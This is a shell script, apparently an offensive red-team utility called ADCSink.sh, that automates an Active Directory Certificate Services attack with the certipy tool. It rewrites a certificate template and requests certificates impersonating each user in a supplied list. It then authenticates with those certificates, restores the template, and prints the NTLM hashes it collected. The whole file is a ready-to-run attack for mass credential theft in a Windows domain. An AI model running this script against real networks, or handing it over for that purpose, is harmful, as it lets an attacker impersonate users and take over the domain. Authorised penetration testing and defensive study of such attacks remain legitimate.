#!/bin/sh
# A POSIX variable
OPTIND=1         # Reset in case getopts has been used previously in the shell.
# Initialize our own variables:
output_file=""
verbose=0
while getopts "h?:v:u:p:d:T:t:i:U::c:H:" opt; do
  case "$opt" in
    h|\?)
      echo "./ADCSink.sh -u username -d domain -p password -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users"
      exit 0
      ;;
    v)  verbose=1
      ;;
    u)  username=$OPTARG
      ;;
    d)  domain=$OPTARG
      ;;
    p)  password=$OPTARG
      ;;
    H)  hash=$OPTARG
      ;;
    T)  template=$OPTARG
      ;;
    t)  targeted_ca=$OPTARG
      ;;
    i)  dc_ip=$OPTARG
      ;;
    U)  targeted_users=$OPTARG
      ;;
    c)  ca_name=$OPTARG
      ;;
  esac
done

shift $((OPTIND-1))

[ "${1:-}" = "--" ] && shift

if [ ! -z "$hash" ]; then
	cmd="-hashes "$hash
fi
if [ ! -z "$password" ]; then
	cmd="-p "$password
fi

execution_date=`date +%s`; output_dir='output_'$template'_'$execution_date
mkdir $output_dir
echo "> Updating the cert template " $template
certipy template -u $username'@'$domain -template $template -save-old $cmd | tee -a $output_dir/logs.txt
mv $template'.json' $output_dir
echo "> Reading targeted users from the file: " $targeted_users
for requested_user in `cat $targeted_users | cut -d '' -f 1`; do 
	echo "> Requesting a certificate for:" $requested_user
	certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user | tee -a $output_dir/logs.txt
	echo "> Authenticating with a certificate for:" $requested_user
        certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc_ip | tee -a $output_dir/logs.txt
done
certipy template -u $username'@'$domain $cmd -template $template -configuration $output_dir/$template'.json'
echo "> This is your hashes: "
grep "Got hash for" $output_dir/logs.txt 
